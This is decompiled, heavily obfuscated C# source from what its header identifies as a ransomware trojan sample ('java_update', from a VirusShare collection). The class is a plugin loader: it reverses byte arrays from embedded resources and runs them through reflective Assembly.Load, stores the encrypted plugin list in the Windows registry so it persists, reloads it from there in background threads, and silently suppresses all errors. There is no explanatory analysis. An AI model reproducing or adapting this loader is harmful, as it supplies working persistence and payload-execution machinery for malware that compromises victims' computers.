// Decompiled with JetBrains decompiler
// Type: ᏬĴவߙւ̞ᙘ.ዸ᧲ṛឈᇱҟអ੨থᤫᰵ໅ƨە
// Assembly: java_update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 557F7238-B13A-4798-94BE-2CA1CC027032
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-501fe6aaa92a5c9bad3bf6a1cdf6d5d77d5236bad8aca53c2ce66f490a365092.exe

using Microsoft.Win32;
using Plugin;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;

namespace ᏬĴவߙւ̞ᙘ
{
  public class ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە
  {
    public static SortedList<Guid, byte[]> \u0A70ᝬႥంఆည\u0DE2᭬૧ೕ\u00D7ར\u0D55 = new SortedList<Guid, byte[]>();
    public static SortedList<Guid, IPlugin> ጱᘢ\u0CF7๙ટച = new SortedList<Guid, IPlugin>();
    private static string \u1DFBԪᡄبঅω᭖ቇᇒ = string.Empty;

    public static event ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u0A40\u0D5Aᐋ\u169Eऻ PluginAdded;

    public static void \u0EE9কᕖᬼާၮඏ\u0EC5Hᬧᔿ\u12C6ᔂᗷബ\u0C3Cћ()
    {
      try
      {
        BinaryFormatter binaryFormatter = new BinaryFormatter();
        MemoryStream serializationStream = new MemoryStream();
        binaryFormatter.Serialize((Stream) serializationStream, (object) ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u0A70ᝬႥంఆည\u0DE2᭬૧ೕ\u00D7ར\u0D55);
        serializationStream.Close();
        byte[] numArray = ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1DF8ᓉѳ\u0861ᅌᏍ(serializationStream.ToArray(), false);
        if (ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u0ADAΚᘔᇼྣமनඟњལရ\u1809ज़\u0FF9᪑ᛕ == RegistryHive.CurrentUser)
          Registry.CurrentUser.CreateSubKey(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u19EAጂ\u0EF5༠ɀಌǒ\u0B96ᐅੰkၘឪ๒ᓾ\u0E8Eᡏ).SetValue(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.ኅᄕȿᵩཟᢌᡀ\u1CC7Ṹׄ\u09B4\u0E5Bݲĸᅵၜ, (object) numArray);
        else
          Registry.LocalMachine.CreateSubKey(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u19EAጂ\u0EF5༠ɀಌǒ\u0B96ᐅੰkၘឪ๒ᓾ\u0E8Eᡏ).SetValue(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.ኅᄕȿᵩཟᢌᡀ\u1CC7Ṹׄ\u09B4\u0E5Bݲĸᅵၜ, (object) numArray);
      }
      catch
      {
      }
    }

    public static void \u1DCBྸ\u1B5Fᑍྵḍᘁᯊ() => new Thread((ThreadStart) (() =>
    {
      try
      {
        BinaryFormatter binaryFormatter = new BinaryFormatter();
        MemoryStream memoryStream;
        byte[] numArray1;
        if (ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u0ADAΚᘔᇼྣமनඟњལရ\u1809ज़\u0FF9᪑ᛕ == RegistryHive.CurrentUser)
        {
          MemoryStream serializationStream = new MemoryStream(ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A6B\u0FEAᛈᓎୣᵈ୧ᬈክᡉᕧҐ\u07BC\u0BF6(Registry.CurrentUser.CreateSubKey(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u19EAጂ\u0EF5༠ɀಌǒ\u0B96ᐅੰkၘឪ๒ᓾ\u0E8Eᡏ).GetValue(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.ኅᄕȿᵩཟᢌᡀ\u1CC7Ṹׄ\u09B4\u0E5Bݲĸᅵၜ) as byte[], false));
          ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u0A70ᝬႥంఆည\u0DE2᭬૧ೕ\u00D7ར\u0D55 = binaryFormatter.Deserialize((Stream) serializationStream) as SortedList<Guid, byte[]>;
          serializationStream.Close();
          serializationStream.Dispose();
          memoryStream = (MemoryStream) null;
          numArray1 = (byte[]) null;
        }
        else
        {
          MemoryStream serializationStream = new MemoryStream(ϵചန\u0FEAᵈ\u05C3ᐊᴩ\u07FBᦤᕱᴳकШṯᶅ၇\u0CF0\u19F6.\u1A6B\u0FEAᛈᓎୣᵈ୧ᬈክᡉᕧҐ\u07BC\u0BF6(Registry.LocalMachine.CreateSubKey(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.\u19EAጂ\u0EF5༠ɀಌǒ\u0B96ᐅੰkၘឪ๒ᓾ\u0E8Eᡏ).GetValue(ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.ኅᄕȿᵩཟᢌᡀ\u1CC7Ṹׄ\u09B4\u0E5Bݲĸᅵၜ) as byte[], false));
          ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u0A70ᝬႥంఆည\u0DE2᭬૧ೕ\u00D7ར\u0D55 = binaryFormatter.Deserialize((Stream) serializationStream) as SortedList<Guid, byte[]>;
          serializationStream.Close();
          serializationStream.Dispose();
          memoryStream = (MemoryStream) null;
          numArray1 = (byte[]) null;
        }
        foreach (byte[] numArray2 in (IEnumerable<byte[]>) ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u0A70ᝬႥంఆည\u0DE2᭬૧ೕ\u00D7ར\u0D55.Values)
          ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.ญጩᓹ\u1779ᛮ\u128Fᓯ\u0FE4ိᬗ(numArray2);
      }
      catch
      {
      }
    })).Start();

    public static void \u00A5ĝΟᗹỹቼᥑ\u136BɓႣᑻ\u0E7Cƅժᢗ\u1C9Bֆᚧ\u00B4() => new Thread((ThreadStart) (() =>
    {
      try
      {
        if (Assembly.GetExecutingAssembly().GetManifestResourceNames().Length == 0)
          return;
        ResourceManager resourceManager = new ResourceManager("p", Assembly.GetExecutingAssembly());
        int num = (int) resourceManager.GetObject("Len");
        for (int index = 0; index < num; ++index)
        {
          byte[] numArray = (byte[]) resourceManager.GetObject(index.ToString());
          Array.Reverse((Array) numArray);
          ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.ญጩᓹ\u1779ᛮ\u128Fᓯ\u0FE4ိᬗ(numArray);
        }
        if (!ᒜ᭙ؔ\u18FD\u08CC\u0BD1ᒲỽࢦᛜᤝ\u009Fк.ᏵἍ\u0E63ᙃᵿ\u0FEBϭ᪼\u0090ᒴဤ᳹ൂ\u1CB1ᇗ)
          return;
        ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u0EE9কᕖᬼާၮඏ\u0EC5Hᬧᔿ\u12C6ᔂᗷബ\u0C3Cћ();
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    })).Start();

    public static bool ญጩᓹ\u1779ᛮ\u128Fᓯ\u0FE4ိᬗ(byte[] _param0)
    {
      try
      {
        foreach (Type type in Assembly.Load(_param0).GetTypes())
        {
          int num = 0;
          if (type.IsClass && type.IsSubclassOf(typeof (IPlugin)))
          {
            IPlugin instance = (IPlugin) Activator.CreateInstance(type);
            if (instance.ExecuteOnLoad)
            {
              instance.Initialize();
              ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.Μಗ\u07BAᱺஇ੭᪼ᇗ২ۮዊᘺ\u0F2Fᯘഭ((object) null, instance, instance.ExecuteOnLoadArgs);
            }
            if (!ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u0A70ᝬႥంఆည\u0DE2᭬૧ೕ\u00D7ར\u0D55.ContainsKey(instance.Guid))
              ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u0A70ᝬႥంఆည\u0DE2᭬૧ೕ\u00D7ར\u0D55.Add(instance.Guid, _param0);
            else
              ++num;
            if (!ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.ጱᘢ\u0CF7๙ટച.ContainsKey(instance.Guid))
              ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.ጱᘢ\u0CF7๙ટച.Add(instance.Guid, instance);
            else
              ++num;
            ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u1DFBԪᡄبঅω᭖ቇᇒ = string.Empty;
            if (num == 2)
            {
              ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u1DFBԪᡄبঅω᭖ቇᇒ = instance.Name + ": Already Stored";
              return false;
            }
            if (ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.ᦤඬޠܖܻᯁᤠ\u0D64౧ેᇳ != null)
              ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.ᦤඬޠܖܻᯁᤠ\u0D64౧ેᇳ((object) null, instance);
            return true;
          }
        }
        ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u1DFBԪᡄبঅω᭖ቇᇒ = "Class with IPlugin interface not found...";
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
        ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u1DFBԪᡄبঅω᭖ቇᇒ = ex.Message;
      }
      return false;
    }

    public static bool \u085B\u0EC5\u0FF3ឭႝ\u1CBBֱᨄñᣌ\u0CFEᄴᐍ(IPlugin _param0)
    {
      if (!ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.ጱᘢ\u0CF7๙ટച.ContainsKey(_param0.Guid))
      {
        ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.ጱᘢ\u0CF7๙ટച.Add(_param0.Guid, _param0);
        ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u1DFBԪᡄبঅω᭖ቇᇒ = string.Empty;
        if (ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.ᦤඬޠܖܻᯁᤠ\u0D64౧ેᇳ != null)
          ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.ᦤඬޠܖܻᯁᤠ\u0D64౧ેᇳ((object) null, _param0);
        return true;
      }
      ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u1DFBԪᡄبঅω᭖ቇᇒ = _param0.Name + ": Already Stored";
      return false;
    }

    public static void ߢᅏᷕᷯụ\u187Fᡙ\u0A78͉ދഊឞᒧӀਲ਼ةἰឿ(Guid _param0)
    {
      if (!ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.ጱᘢ\u0CF7๙ટച.ContainsKey(_param0))
        return;
      ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u0A70ᝬႥంఆည\u0DE2᭬૧ೕ\u00D7ར\u0D55.Remove(_param0);
      ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.ጱᘢ\u0CF7๙ટച.Remove(_param0);
    }

    public static string ᕳซᘂစƴBʜ\u0C4EঢἭ() => ዸ\u19F2ṛឈᇱҟអ੨থᤫᰵ\u0EC5ƨە.\u1DFBԪᡄبঅω᭖ቇᇒ;

    public static void Μಗ\u07BAᱺஇ੭᪼ᇗ২ۮዊᘺ\u0F2Fᯘഭ(
      object _param0,
      IPlugin _param1,
      PluginArgs _param2)
    {
      new Thread((ThreadStart) (() =>
      {
        try
        {
          _param1.Execute(_param0, _param2);
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.Message);
        }
      })).Start();
    }

    public delegate void \u0A40\u0D5Aᐋ\u169Eऻ(object ᄦҡᙲݩሳͨ, IPlugin _param2);
  }
}
